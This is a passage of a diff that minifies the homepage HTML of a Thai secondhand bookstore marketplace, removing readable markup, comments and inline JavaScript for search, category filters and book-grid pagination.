@@ -1,648 +1,99 @@
-<!DOCTYPE html>
-<html lang="th">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ร้านหนังสือมือสอง | Secondhand Bookstore</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="css/styles.css" />
-</head>
-<body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]">
-  <div id="site-header"></div>
-
-  <main class="flex-1">
-    <!-- 1. MINIMAL PASTEL HERO BANNER + FLOATING HERO ELEMENTS -->
-    <section class="max-w-6xl mx-auto px-4 sm:px-6 pt-6 sm:pt-8">
-      <div class="pastel-hero-banner rounded-3xl border border-[#DCECE9] shadow-xs relative">
-        <!-- ไอคอนตกแต่งลอยขึ้น-ลงเบาๆ ด้านซ้าย-ขวา (Floating Hero Elements) -->
-        <div class="hidden sm:block pointer-events-none select-none" aria-hidden="true">
-          <span class="floating-slow absolute top-8 left-8 text-3xl opacity-45">📚</span>
-          <span class="sparkle-twinkle absolute top-16 left-24 text-xl opacity-60">✨</span>
-          <span class="floating-reverse absolute bottom-12 left-14 text-2xl opacity-40">🔖</span>
-          <span class="floating-reverse absolute top-9 right-10 text-3xl opacity-45">📖</span>
-          <span class="sparkle-twinkle absolute top-20 right-28 text-xl opacity-60">🌟</span>
-          <span class="floating-slow absolute bottom-12 right-14 text-2xl opacity-40">🌷</span>
-        </div>
-
-        <div class="pastel-hero-dots px-6 py-12 sm:py-15 pb-16 sm:pb-20 text-center flex flex-col items-center justify-center relative z-10">
-          <!-- ป้ายแคปซูลเล็กๆ สีขาวขอบส้มอ่อน ด้านบนสุด -->
-          <div class="inline-flex items-center gap-1.5 px-4 py-1 rounded-full bg-white border border-[#F4A261]/60 text-[#E9964A] text-xs font-bold shadow-2xs mb-4">
-            <span>✨</span>
-            <span>ชุมชนคนรักการอ่าน &amp; ส่งต่อหนังสือดี</span>
-          </div>
-
-          <!-- หัวข้อใหญ่ตรงกลาง: 'ร้านหนังสือมือสอง' และซับไตเติ้ลสีส้ม 'Secondhand Bookstore' -->
-          <h1 class="text-3xl sm:text-5xl font-extrabold text-[#1F4E4B] tracking-tight">
+<!DOCTYPE html><html lang="th"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>ร้านหนังสือมือสอง | Secondhand Bookstore</title><script src="https://cdn.tailwindcss.com"></script><link rel="stylesheet" href="css/styles.css" /></head><body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]"><div id="site-header"></div><main class="flex-1"><section class="max-w-6xl mx-auto px-4 sm:px-6 pt-6 sm:pt-8"><div class="pastel-hero-banner rounded-3xl border border-[#DCECE9] shadow-xs relative"><div class="hidden sm:block pointer-events-none select-none" aria-hidden="true"><span class="floating-slow absolute top-8 left-8 text-3xl opacity-45">📚</span><span class="sparkle-twinkle absolute top-16 left-24 text-xl opacity-60">✨</span><span class="floating-reverse absolute bottom-12 left-14 text-2xl opacity-40">🔖</span><span class="floating-reverse absolute top-9 right-10 text-3xl opacity-45">📖</span><span class="sparkle-twinkle absolute top-20 right-28 text-xl opacity-60">🌟</span><span class="floating-slow absolute bottom-12 right-14 text-2xl opacity-40">🌷</span></div><div class="pastel-hero-dots px-6 py-12 sm:py-15 pb-16 sm:pb-20 text-center flex flex-col items-center justify-center relative z-10"><div class="inline-flex items-center gap-1.5 px-4 py-1 rounded-full bg-white border border-[#F4A261]/60 text-[#E9964A] text-xs font-bold shadow-2xs mb-4"><span>✨</span><span>ชุมชนคนรักการอ่าน &amp; ส่งต่อหนังสือดี</span></div><h1 class="text-3xl sm:text-5xl font-extrabold text-[#1F4E4B] tracking-tight">
             ร้านหนังสือมือสอง
-          </h1>
-          <p class="text-lg sm:text-2xl font-bold text-[#E9964A] mt-1">
+          </h1><p class="text-lg sm:text-2xl font-bold text-[#E9964A] mt-1">
             Secondhand Bookstore
-          </p>
-
-          <!-- คำโปรยสั้นๆ แค่ 1 บรรทัด -->
-          <p class="text-xs sm:text-sm text-[#5F7470] max-w-xl mx-auto mt-3 font-medium">
+          </p><p class="text-xs sm:text-sm text-[#5F7470] max-w-xl mx-auto mt-3 font-medium">
             ตลาดกลางซื้อ-ขายหนังสือมือสองคุณภาพ จองคิวเป็นธรรม ปลอดภัยผ่านบัญชีกลาง
-          </p>
-
-          <!-- ป้ายแคปซูลสีขาวเล็กๆ (Pill Badges) 3 อันเรียงกัน -->
-          <div class="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3 mt-6">
-            <span class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-white/95 border border-[#E6E1D6] text-[#1F4E4B] text-xs font-bold shadow-2xs">
-              <span>🏠</span>
-              <span id="hero-book-count-badge">หนังสือในระบบ</span>
-            </span>
-
-            <span class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-white/95 border border-[#E6E1D6] text-[#1F4E4B] text-xs font-bold shadow-2xs">
-              <span>📖</span>
-              <span>จองคิวอย่างเป็นธรรม</span>
-            </span>
-
-            <button
+          </p><div class="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3 mt-6"><span class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-white/95 border border-[#E6E1D6] text-[#1F4E4B] text-xs font-bold shadow-2xs"><span>🏠</span><span id="hero-book-count-badge">หนังสือในระบบ</span></span><span class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-white/95 border border-[#E6E1D6] text-[#1F4E4B] text-xs font-bold shadow-2xs"><span>📖</span><span>จองคิวอย่างเป็นธรรม</span></span><button
               type="button"
               onclick="openEscrowRulesModal()"
               class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-white hover:bg-[#FDF2E2] border border-[#F4A261]/70 text-[#1F4E4B] hover:text-[#E9964A] text-xs font-bold shadow-2xs transition cursor-pointer"
-            >
-              <span>🛡️</span>
-              <span>ซื้อขายปลอดภัย (คลิกอ่านกติกา)</span>
-            </button>
-
-            <button
+            ><span>🛡️</span><span>ซื้อขายปลอดภัย (คลิกอ่านกติกา)</span></button><button
               type="button"
               onclick="openMerchantBadgeModal()"
               class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-[#FDF2E2] hover:bg-[#fbe5c5] border border-[#F4A261] text-[#1F4E4B] hover:text-[#E9964A] text-xs font-bold shadow-2xs transition cursor-pointer"
-            >
-              <span>👑</span>
-              <span>สมัครสัญลักษณ์ร้านค้าแนะนำ &amp; ดันฟีดหน้าแรก</span>
-            </button>
-
-            <a
+            ><span>👑</span><span>สมัครสัญลักษณ์ร้านค้าแนะนำ &amp; ดันฟีดหน้าแรก</span></button><a
               href="profile.html?tab=dashboard"
               class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full bg-white hover:bg-[#E0F4F1] border border-[#BCE3DF] text-[#1F4E4B] hover:text-[#26A69A] text-xs font-bold shadow-2xs transition"
-            >
-              <span>📊</span>
-              <span>แดชบอร์ดสถิติ (Dashboard)</span>
-            </a>
-          </div>
-        </div>
-      </div>
-
-      <!-- 2. ช่องค้นหาอัจฉริยะคาบเกี่ยวขอบแบนเนอร์ + ป้ายคำค้นหายอดฮิต (Trending Tags) -->
-      <div class="relative z-20 -mt-7 max-w-2xl mx-auto px-2">
-        <div class="smart-search-box relative flex items-center bg-white rounded-full shadow-md border border-[#E6E1D6] px-5 py-3.5">
-          <svg class="w-5 h-5 text-[#E9964A] shrink-0 mr-3" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-4.35-4.35M11 19a8 8 0 100-16 8 8 0 000 16z"/>
-          </svg>
-          <input
+            ><span>📊</span><span>แดชบอร์ดสถิติ (Dashboard)</span></a></div></div></div><div class="relative z-20 -mt-7 max-w-2xl mx-auto px-2"><div class="smart-search-box relative flex items-center bg-white rounded-full shadow-md border border-[#E6E1D6] px-5 py-3.5"><svg class="w-5 h-5 text-[#E9964A] shrink-0 mr-3" fill="none" stroke="currentColor" stroke-width="2.2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-4.35-4.35M11 19a8 8 0 100-16 8 8 0 000 16z"/></svg><input
             id="home-search-input"
             type="text"
             placeholder="ค้นหาหนังสือ ชื่อผู้แต่ง หรือหมวดหมู่..."
             class="w-full bg-transparent text-sm text-[#1F4E4B] placeholder-[#5F7470]/70 focus:outline-none"
             onfocus="showTrendingTagsBar()"
             oninput="debouncedHomeSearch()"
-          />
-          <button
+          /><button
             id="home-search-clear"
             type="button"
             onclick="clearHomeSearch()"
             class="hidden text-xs font-semibold text-[#5F7470] hover:text-[#E9964A] px-2.5 py-1 rounded-full bg-[#FAF7F2] cursor-pointer"
           >
             ล้าง
-          </button>
-        </div>
-
-        <!-- ป้ายคำค้นหายอดฮิต (Trending Tags) คลิกเลือกกรองได้ทันที -->
-        <div
+          </button></div><div
           id="trending-tags-bar"
           class="mt-2.5 px-3 py-2 rounded-2xl bg-white/90 border border-[#E6E1D6]/80 shadow-2xs flex flex-wrap items-center justify-center gap-1.5 text-xs transition-all duration-300"
-        >
-          <span class="font-bold text-[#E9964A] mr-1">🔥 คำค้นฮิต:</span>
-          <button type="button" onclick="applyTrendingTag('mystery')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
+        ><span class="font-bold text-[#E9964A] mr-1">🔥 คำค้นฮิต:</span><button type="button" onclick="applyTrendingTag('mystery')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
             #สืบสวน
-          </button>
-          <button type="button" onclick="applyTrendingTag('manga')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
+          </button><button type="button" onclick="applyTrendingTag('manga')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
             #มังงะครบชุด
-          </button>
-          <button type="button" onclick="applyTrendingTag('angel90')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
+          </button><button type="button" onclick="applyTrendingTag('angel90')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
             #สภาพนางฟ้า
-          </button>
-          <button type="button" onclick="applyTrendingTag('under100')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
+          </button><button type="button" onclick="applyTrendingTag('under100')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
             #ไม่เกิน100บาท
-          </button>
-          <button type="button" onclick="applyTrendingTag('blgl')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
+          </button><button type="button" onclick="applyTrendingTag('blgl')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
             #นิยายวาย
-          </button>
-          <button type="button" onclick="applyTrendingTag('rare')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
+          </button><button type="button" onclick="applyTrendingTag('rare')" class="px-2.5 py-1 rounded-full bg-[#FAF7F2] hover:bg-[#E0F4F1] text-[#1F4E4B] hover:text-[#26A69A] font-semibold border border-[#E6E1D6] transition cursor-pointer">
             #หนังสือหายาก
-          </button>
-        </div>
-      </div>
-    </section>
-
-    <!-- 3. หมวดหมู่หนังสือ 20 หมวดหมู่ (พร้อมปุ่มย่อ/ขยาย) + แถบคัดกรองด่วน 1 บรรทัด (Smart Quick Filter Bar) -->
-    <section class="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-14">
-      <!-- 3.1 หมวดหมู่ 20 หมวดหมู่ พร้อมปุ่ม [+ ดูหมวดหมู่ทั้งหมด (20)] -->
-      <div class="mb-5">
-        <div class="flex items-center justify-between mb-2.5 px-1">
-          <span class="text-xs font-bold uppercase tracking-wider text-[#5F7470]">หมวดหมู่หนังสือ (20 หมวดหมู่)</span>
-          <button
+          </button></div></div></section><section class="max-w-6xl mx-auto px-4 sm:px-6 pt-6 pb-14"><div class="mb-5"><div class="flex items-center justify-between mb-2.5 px-1"><span class="text-xs font-bold uppercase tracking-wider text-[#5F7470]">หมวดหมู่หนังสือ (20 หมวดหมู่)</span><button
             type="button"
             onclick="toggleExpandCategories()"
             id="category-expand-top-btn"
             class="text-xs font-bold text-[#26A69A] hover:underline cursor-pointer"
           >
             + ดูหมวดหมู่ทั้งหมด (20)
-          </button>
-        </div>
-        <div id="home-category-pills" class="flex flex-wrap items-center gap-2"></div>
-      </div>
-
-      <!-- 3.2 แถบช่วยคัดกรองด่วน (Smart Quick Filter Bar) แบบบรรทัดเดียว -->
-      <div class="bg-white rounded-2xl border border-[#E6E1D6] p-3 sm:px-4 sm:py-3 shadow-2xs mb-7 flex flex-wrap items-center justify-between gap-3">
-        <!-- ซ้าย: ปุ่มสลับกรองสถานะคิว [🟢 เฉพาะคิวว่างพร้อมจอง] / [⏳ ดูทั้งหมด] + ปุ่มรายการที่กดหัวใจไว้ -->
-        <div class="flex flex-wrap items-center gap-2">
-          <div class="inline-flex items-center bg-[#FAF7F2] p-1 rounded-full border border-[#E6E1D6]">
-            <button
+          </button></div><div id="home-category-pills" class="flex flex-wrap items-center gap-2"></div></div><div class="bg-white rounded-2xl border border-[#E6E1D6] p-3 sm:px-4 sm:py-3 shadow-2xs mb-7 flex flex-wrap items-center justify-between gap-3"><div class="flex flex-wrap items-center gap-2"><div class="inline-flex items-center bg-[#FAF7F2] p-1 rounded-full border border-[#E6E1D6]"><button
               type="button"
               id="qfilter-all-btn"
               onclick="setQueueFilter('all')"
               class="px-3.5 py-1.5 rounded-full text-xs font-bold transition cursor-pointer bg-[#26A69A] text-white shadow-2xs"
             >
               ⏳ ดูทั้งหมด
-            </button>
-            <button
+            </button><button
               type="button"
               id="qfilter-available-btn"
               onclick="setQueueFilter('available')"
               class="px-3.5 py-1.5 rounded-full text-xs font-bold transition cursor-pointer text-[#1F4E4B] hover:text-[#26A69A]"
             >
               🟢 เฉพาะคิวว่างพร้อมจอง
-            </button>
-          </div>
-
-          <button
+            </button></div><button
             type="button"
             id="qfilter-wishlist-btn"
             onclick="toggleWishlistFilter()"
             class="px-3.5 py-1.5 rounded-full text-xs font-bold border border-[#E6E1D6] bg-[#FAF7F2] hover:border-[#E9964A] text-[#1F4E4B] transition cursor-pointer"
           >
             🤍 ที่เก็บไว้ (<span id="wishlist-count-pill">0</span>)
-          </button>
-        </div>
-
-        <!-- ขวา: ดรอปดาวน์ กรองช่วงราคา, สภาพหนังสือ, และเรียงลำดับ -->
-        <div class="flex flex-wrap items-center gap-2 text-xs">
-          <!-- กรองช่วงราคา -->
-          <select
+          </button></div><div class="flex flex-wrap items-center gap-2 text-xs"><select
             id="filter-price-range"
             onchange="handleHomeFilterChange()"
             class="rounded-full border border-[#E6E1D6] bg-[#FAF7F2] hover:border-[#26A69A] px-3.5 py-2 font-bold text-[#1F4E4B] focus:border-[#26A69A] focus:outline-none cursor-pointer"
-          >
-            <option value="all">💰 ทุกช่วงราคา</option>
-            <option value="under100">ไม่เกิน 100฿</option>
-            <option value="100to300">100฿ - 300฿</option>
-            <option value="over300">300฿ ขึ้นไป</option>
-          </select>
-
-          <!-- กรองสภาพหนังสือ -->
-          <select
+          ><option value="all">💰 ทุกช่วงราคา</option><option value="under100">ไม่เกิน 100฿</option><option value="100to300">100฿ - 300฿</option><option value="over300">300฿ ขึ้นไป</option></select><select
             id="filter-condition"
             onchange="handleHomeFilterChange()"
             class="rounded-full border border-[#E6E1D6] bg-[#FAF7F2] hover:border-[#26A69A] px-3.5 py-2 font-bold text-[#1F4E4B] focus:border-[#26A69A] focus:outline-none cursor-pointer"
-          >
-            <option value="0">✨ ทุกสภาพ</option>
-            <option value="90">สภาพนางฟ้า 90%+</option>
-            <option value="80">สภาพดี 80%+</option>
-          </select>
-
-          <!-- เรียงลำดับ -->
-          <select
+          ><option value="0">✨ ทุกสภาพ</option><option value="90">สภาพนางฟ้า 90%+</option><option value="80">สภาพดี 80%+</option></select><select
             id="filter-sort"
             onchange="handleHomeFilterChange()"
             class="rounded-full border border-[#E6E1D6] bg-[#FAF7F2] hover:border-[#26A69A] px-3.5 py-2 font-bold text-[#1F4E4B] focus:border-[#26A69A] focus:outline-none cursor-pointer"
-          >
-            <option value="latest">เรียง: ลงขายล่าสุด</option>
-            <option value="price-asc">เรียง: ราคาถูกสุด</option>
-            <option value="popular-queue">เรียง: คิวจองฮิตสุด</option>
-          </select>
-
-          <button
+          ><option value="latest">เรียง: ลงขายล่าสุด</option><option value="price-asc">เรียง: ราคาถูกสุด</option><option value="popular-queue">เรียง: คิวจองฮิตสุด</option></select><button
             id="reset-quick-filters-btn"
             type="button"
             onclick="resetAllHomeFilters()"
             class="hidden px-3 py-1.5 rounded-full bg-[#FDF2E2] text-[#E9964A] font-bold hover:opacity-90 transition cursor-pointer"
           >
             ล้างตัวกรอง
-          </button>
-        </div>
-      </div>
-
-      <!-- ส่วนหัวรายการหนังสือ + จำนวนเล่ม -->
-      <div class="flex items-center justify-between mb-5 px-1">
-        <div class="flex items-center gap-2">
-          <h2 id="home-books-heading" class="text-lg sm:text-xl font-extrabold text-[#1F4E4B]">รายการหนังสือทั้งหมด</h2>
-          <span id="active-filter-summary" class="text-xs font-semibold text-[#E9964A]"></span>
-        </div>
-        <span id="home-books-count" class="text-xs font-bold text-[#5F7470]">0 เล่ม</span>
-      </div>
-
-      <!-- ตารางการ์ดหนังสือแบบมีมิติ (Interactive Book Cards) -->
-      <div id="home-books-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5"></div>
-
-      <!-- ปุ่มแบ่งหน้าโหลดข้อมูลครั้งละ 12 เล่ม (Pagination / Load More) -->
-      <div id="home-load-more-wrap" class="hidden mt-8 flex flex-col items-center justify-center gap-2">
-        <p id="home-pagination-info" class="text-xs font-semibold text-[#5F7470]"></p>
-        <button
+          </button></div></div><div class="flex items-center justify-between mb-5 px-1"><div class="flex items-center gap-2"><h2 id="home-books-heading" class="text-lg sm:text-xl font-extrabold text-[#1F4E4B]">รายการหนังสือทั้งหมด</h2><span id="active-filter-summary" class="text-xs font-semibold text-[#E9964A]"></span></div><span id="home-books-count" class="text-xs font-bold text-[#5F7470]">0 เล่ม</span></div><div id="home-books-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5"></div><div id="home-load-more-wrap" class="hidden mt-8 flex flex-col items-center justify-center gap-2"><p id="home-pagination-info" class="text-xs font-semibold text-[#5F7470]"></p><button
           type="button"
           onclick="loadMoreHomeBooks()"
           class="inline-flex items-center gap-2 px-6 py-3 rounded-full bg-white hover:bg-[#E0F4F1] border-2 border-[#26A69A] text-[#1F4E4B] hover:text-[#26A69A] text-xs sm:text-sm font-extrabold shadow-xs transition cursor-pointer"
-        >
-          <span>📖</span>
-          <span>โหลดหนังสือเพิ่มเติม (ครั้งละ 12 เล่ม)</span>
-        </button>
-      </div>
-    </section>
-  </main>
-
-  <div id="site-footer"></div>
-
-  <script src="js/books-data.js"></script>
-  <script src="js/app.js"></script>
-  <script>
-    let selectedCategory = 'all';
-    let isCategoriesExpanded = false;
-    let queueFilterMode = 'all'; // 'all' | 'available'
-    let onlyWishlisted = false;
-    let homeCurrentPage = 1;
-    const HOME_PAGE_SIZE = 12; // โหลดหนังสือครั้งละ 12 เล่ม (Pagination)
-    const INITIAL_VISIBLE_CATEGORIES = 10; // แสดงแถวแรก 10 หมวดหลักก่อน
-
-    // Debounce 300ms สำหรับช่องค้นหาหนังสือ ป้องกันการยิง API ทุกครั้งที่พิมพ์ตัวอักษร
-    const debouncedHomeSearch = window.debounce
-      ? window.debounce(() => {
-          homeCurrentPage = 1;
-          handleHomeFilterChange(true);
-        }, 300)
-      : () => {
-          homeCurrentPage = 1;
-          handleHomeFilterChange(true);
-        };
-
-    function showTrendingTagsBar() {
-      const bar = document.getElementById('trending-tags-bar');
-      if (bar) {
-        bar.classList.add('border-[#26A69A]', 'bg-[#E0F4F1]/40');
-        setTimeout(() => {
-          bar.classList.remove('border-[#26A69A]', 'bg-[#E0F4F1]/40');
-        }, 900);
-      }
-    }
-
-    function applyTrendingTag(tagType) {
-      // รีเซ็ตค่าเริ่มต้นก่อนใช้แท็กฮิต
-      selectedCategory = 'all';
-      onlyWishlisted = false;
-      queueFilterMode = 'all';
-      document.getElementById('home-search-input').value = '';
-      document.getElementById('filter-price-range').value = 'all';
-      document.getElementById('filter-condition').value = '0';
-      document.getElementById('filter-sort').value = 'latest';
-
-      if (tagType === 'mystery') {
-        selectedCategory = 'mystery-thriller';
-      } else if (tagType === 'manga') {
-        selectedCategory = 'manga';
-      } else if (tagType === 'angel90') {
-        document.getElementById('filter-condition').value = '90';
-      } else if (tagType === 'under100') {
-        document.getElementById('filter-price-range').value = 'under100';
-        document.getElementById('filter-sort').value = 'price-asc';
-      } else if (tagType === 'blgl') {
-        selectedCategory = 'bl-gl';
-      } else if (tagType === 'rare') {
-        selectedCategory = 'rare-books';
-      }
-
-      updateQueueFilterButtonsUI();
-      renderCategoryPills();
-      handleHomeFilterChange(true);
-    }
-
-    function toggleExpandCategories() {
-      isCategoriesExpanded = !isCategoriesExpanded;
-      renderCategoryPills();
-    }
-
-    function selectHomeCategory(catId) {
-      selectedCategory = catId;
-      homeCurrentPage = 1;
-      // หากเลือกหมวดที่อยู่ในส่วนที่ซ่อนอยู่ ให้กางออกอัตโนมัติ
-      const allPills = ['all', ...(window.CATEGORIES || []).map(c => c.id)];
-      const idx = allPills.indexOf(catId);
-      if (idx >= INITIAL_VISIBLE_CATEGORIES) {
-        isCategoriesExpanded = true;
-      }
-      renderCategoryPills();
-      renderHomeBooksGrid(true);
-    }
-
-    function setQueueFilter(mode) {
-      queueFilterMode = mode;
-      homeCurrentPage = 1;
-      updateQueueFilterButtonsUI();
-      renderHomeBooksGrid(true);
-    }
-
-    function toggleWishlistFilter() {
-      onlyWishlisted = !onlyWishlisted;
-      homeCurrentPage = 1;
-      updateQueueFilterButtonsUI();
-      renderHomeBooksGrid(true);
-    }
-
-    function loadMoreHomeBooks() {
-      homeCurrentPage += 1;
-      renderHomeBooksGrid(false);
-    }
-
-    function updateQueueFilterButtonsUI() {
-      const allBtn = document.getElementById('qfilter-all-btn');
-      const availBtn = document.getElementById('qfilter-available-btn');
-      const wishBtn = document.getElementById('qfilter-wishlist-btn');
-      const wishCountEl = document.getElementById('wishlist-count-pill');
-
-      if (wishCountEl) {
-        wishCountEl.textContent = getWishlistIds().length;
-      }
-
-      if (allBtn && availBtn) {
-        if (queueFilterMode === 'available') {
-          availBtn.className = 'px-3.5 py-1.5 rounded-full text-xs font-bold transition cursor-pointer bg-[#26A69A] text-white shadow-2xs';
-          allBtn.className = 'px-3.5 py-1.5 rounded-full text-xs font-bold transition cursor-pointer text-[#1F4E4B] hover:text-[#26A69A]';
-        } else {
-          allBtn.className = 'px-3.5 py-1.5 rounded-full text-xs font-bold transition cursor-pointer bg-[#26A69A] text-white shadow-2xs';
-          availBtn.className = 'px-3.5 py-1.5 rounded-full text-xs font-bold transition cursor-pointer text-[#1F4E4B] hover:text-[#26A69A]';
-        }
-      }
-
-      if (wishBtn) {
-        if (onlyWishlisted) {
-          wishBtn.className = 'px-3.5 py-1.5 rounded-full text-xs font-bold border border-[#F4A261] bg-[#FDF2E2] text-[#E9964A] shadow-2xs transition cursor-pointer';
-          wishBtn.innerHTML = `🧡 ที่เก็บไว้ (<span id="wishlist-count-pill">${getWishlistIds().length}</span>)`;
-        } else {
-          wishBtn.className = 'px-3.5 py-1.5 rounded-full text-xs font-bold border border-[#E6E1D6] bg-[#FAF7F2] hover:border-[#E9964A] text-[#1F4E4B] transition cursor-pointer';
-          wishBtn.innerHTML = `🤍 ที่เก็บไว้ (<span id="wishlist-count-pill">${getWishlistIds().length}</span>)`;
-        }
-      }
-    }
-
-    function clearHomeSearch() {
-      const input = document.getElementById('home-search-input');
-      if (input) input.value = '';
-      handleHomeFilterChange(true);
-    }
-
-    function resetAllHomeFilters() {
-      selectedCategory = 'all';
-      queueFilterMode = 'all';
-      onlyWishlisted = false;
-      const searchInput = document.getElementById('home-search-input');
-      if (searchInput) searchInput.value = '';
-      document.getElementById('filter-price-range').value = 'all';
-      document.getElementById('filter-condition').value = '0';
-      document.getElementById('filter-sort').value = 'latest';
-      updateQueueFilterButtonsUI();
-      renderCategoryPills();
-      handleHomeFilterChange(true);
-    }
-
-    function handleHomeFilterChange(animate = true) {
-      homeCurrentPage = 1;
-      const input = document.getElementById('home-search-input');
-      const clearBtn = document.getElementById('home-search-clear');
-      if (clearBtn && input) {
-        clearBtn.classList.toggle('hidden', !input.value.trim());
-      }
-      renderHomeBooksGrid(animate);
-    }
-
-    function renderCategoryPills() {
-      const container = document.getElementById('home-category-pills');
-      const topToggleBtn = document.getElementById('category-expand-top-btn');
-      if (!container) return;
-
-      const allBooks = window.BOOKS || [];
-      const pills = [
-        { id: 'all', icon: '✨', name: 'ทั้งหมด', count: allBooks.length },
-        ...(window.CATEGORIES || []).map(c => ({
-          id: c.id,
-          icon: c.icon,
-          name: c.name,
-          count: allBooks.filter(b => b.category === c.id).length
-        }))
-      ];
-
-      const totalCategoryCount = pills.length; // 20 หมวดหมู่
-      const visiblePills = isCategoriesExpanded ? pills : pills.slice(0, INITIAL_VISIBLE_CATEGORIES);
-
-      if (topToggleBtn) {
-        topToggleBtn.textContent = isCategoriesExpanded
-          ? '− ย่อหมวดหมู่'
-          : `+ ดูหมวดหมู่ทั้งหมด (${totalCategoryCount})`;
-      }
-
-      const pillsHTML = visiblePills.map(p => {
-        const isActive = selectedCategory === p.id;
-        return `
-          <button
-            type="button"
-            onclick="selectHomeCategory('${p.id}')"
-            class="inline-flex items-center gap-1.5 px-4 py-2 rounded-full text-xs sm:text-sm font-bold transition cursor-pointer ${
-              isActive
-                ? 'bg-[#26A69A] text-white shadow-xs'
-                : 'bg-white text-[#1F4E4B] border border-[#E6E1D6] hover:border-[#26A69A] hover:text-[#26A69A]'
-            }"
-          >
-            <span>${p.icon}</span>
-            <span>${p.name}</span>
-            <span class="text-[11px] ${isActive ? 'text-white/90' : 'text-[#5F7470]'}">(${p.count})</span>
-          </button>
-        `;
-      }).join('');
-
-      // ปุ่มแคปซูล [+ ดูหมวดหมู่ทั้งหมด (20)] / [− ย่อหมวดหมู่] ต่อท้ายรายการ
-      const expandButtonHTML = `
-        <button
-          type="button"
-          onclick="toggleExpandCategories()"
-          class="inline-flex items-center gap-1 px-4 py-2 rounded-full text-xs sm:text-sm font-bold bg-[#FDF2E2] hover:bg-[#fbe5c5] text-[#E9964A] border border-[#F4A261]/50 transition cursor-pointer"
-        >
-          <span>${isCategoriesExpanded ? `− ย่อหมวดหมู่` : `+ ดูหมวดหมู่ทั้งหมด (${totalCategoryCount})`}</span>
-        </button>
-      `;
-
-      container.innerHTML = pillsHTML + expandButtonHTML;
-    }
-
-    function renderHomeBooksGrid(animate = false) {
-      const grid = document.getElementById('home-books-grid');
-      const countEl = document.getElementById('home-books-count');
-      const headingEl = document.getElementById('home-books-heading');
-      const summaryEl = document.getElementById('active-filter-summary');
-      const resetBtn = document.getElementById('reset-quick-filters-btn');
-      const heroBadgeEl = document.getElementById('hero-book-count-badge');
-
-      const query = (document.getElementById('home-search-input')?.value || '').trim().toLowerCase();
-      const priceRange = document.getElementById('filter-price-range')?.value || 'all';
-      const minCondition = Number(document.getElementById('filter-condition')?.value || '0');
-      const sortBy = document.getElementById('filter-sort')?.value || 'latest';
-      const wishlistIds = getWishlistIds();
-
-      const allBooks = window.BOOKS || [];
-      if (heroBadgeEl) {
-        heroBadgeEl.textContent = `หนังสือในระบบ (${allBooks.length} เล่ม)`;
-      }
-
-      const hasActiveFilters =
-        selectedCategory !== 'all' ||
-        queueFilterMode !== 'all' ||
-        onlyWishlisted ||
-        Boolean(query) ||
-        priceRange !== 'all' ||
-        minCondition > 0 ||
-        sortBy !== 'latest';
-
-      if (resetBtn) {
-        resetBtn.classList.toggle('hidden', !hasActiveFilters);
-      }
-
-      let filtered = allBooks.filter(book => {
-        // 1. หมวดหมู่
-        if (selectedCategory !== 'all' && book.category !== selectedCategory) return false;
-
-        // 2. เฉพาะที่เก็บไว้ (Wishlist)
-        if (onlyWishlisted && !wishlistIds.includes(String(book.id))) return false;
-
-        // 3. สถานะคิวว่างพร้อมจอง
-        if (queueFilterMode === 'available') {
-          const isSoldOut = book.stock <= 0 || book.stock_status === 'Sold Out';
